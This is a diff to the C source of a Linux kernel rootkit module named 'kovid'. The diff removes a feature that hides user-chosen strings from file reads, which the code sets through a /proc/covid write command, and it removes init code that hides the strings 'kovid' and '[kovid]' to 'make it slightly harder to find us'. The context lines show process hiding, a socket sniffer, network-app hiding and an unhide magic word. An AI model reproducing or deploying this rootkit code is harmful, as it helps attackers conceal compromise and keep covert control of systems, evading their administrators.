@@ -68,7 +68,6 @@ struct __lkmmod_t{ struct module *this_mod; };
 static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
-static DEFINE_SPINLOCK(hiddenstr_spin);
 
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
@@ -439,59 +438,6 @@ static int proc_timeout(unsigned int t) {
 }
 
 /**
- * returns a statically allocated
- * string that will be hidden from
- * files.
- * The string can be defined by the user
- * at run time
- */
-static char *load_hidden_string(char *str) {
-    static char *_str = NULL;
-    size_t len;
-
-    /** just return what's set */
-    if (str == NULL)
-        return _str;
-
-    spin_lock(&hiddenstr_spin);
-
-    /**
-     * setting with empty argument
-     * helps m_read to perform better,
-     * if we are not hiding anything
-     * See sys.c:m_read
-     * ex:
-     *  echo "-f" >/proc/covid
-     */
-    if (*str == 0) {
-        if (_str) {
-            kfree(_str);
-            _str = NULL;
-        }
-        goto out;
-
-    }
-
-    /** create/override */
-    if ((len = strlen(str))) {
-        if (_str)
-            kfree(_str);
-        _str = kmalloc(len+1, GFP_KERNEL);
-        if (!_str)
-            goto out;
-        strncpy(_str, str, len);
-    }
-
-out:
-    spin_unlock(&hiddenstr_spin);
-    return _str;
-}
-
-char *kv_get_hidden_string(void) {
-    return load_hidden_string(NULL);
-}
-
-/**
  * Simple commands: hide, <PID>, show
  */
 static ssize_t write_cb(struct file *fptr, const char __user *user,
@@ -580,9 +526,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                     set_elfbits(bits);
                 }
             }
-        /* add string to be hidden from files */
-        } else if (!strncmp(buf, "-f", MIN(2, size))) {
-            load_hidden_string(&buf[3]);
         }
     }
     proc_timeout(PRC_RESET);
@@ -779,7 +722,9 @@ static int __init kv_init(void) {
     if (!tsk_prc)
         goto unroll_init;
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
 cont:
+#endif
     tsk_sniff = kv_sock_start_sniff();
     if (!tsk_sniff)
         goto unroll_init;
@@ -801,12 +746,6 @@ cont:
      * Run once
      */
     kv_scan_and_hide_netapp();
-
-    /**
-     * Make it slightly harder to find us
-     */
-    load_hidden_string("kovid");
-    load_hidden_string("[kovid]");
 
 #ifndef DEBUG_RING_BUFFER
     /** *pr_info because it must be shown even if DEPLOY=1 */
@@ -845,7 +784,6 @@ leave:
 
 static void __exit kv_cleanup(void) {
     char *magik = get_unhide_magic_word();
-    char *hiddenstr;
     if(magik != NULL) {
         kfree(magik);
         magik = NULL;
@@ -868,9 +806,6 @@ static void __exit kv_cleanup(void) {
     }
 
     fs_names_cleanup();
-
-    if ((hiddenstr = kv_get_hidden_string()))
-        kfree(hiddenstr);
 
     prinfo("kovid unloaded.\n");
 }
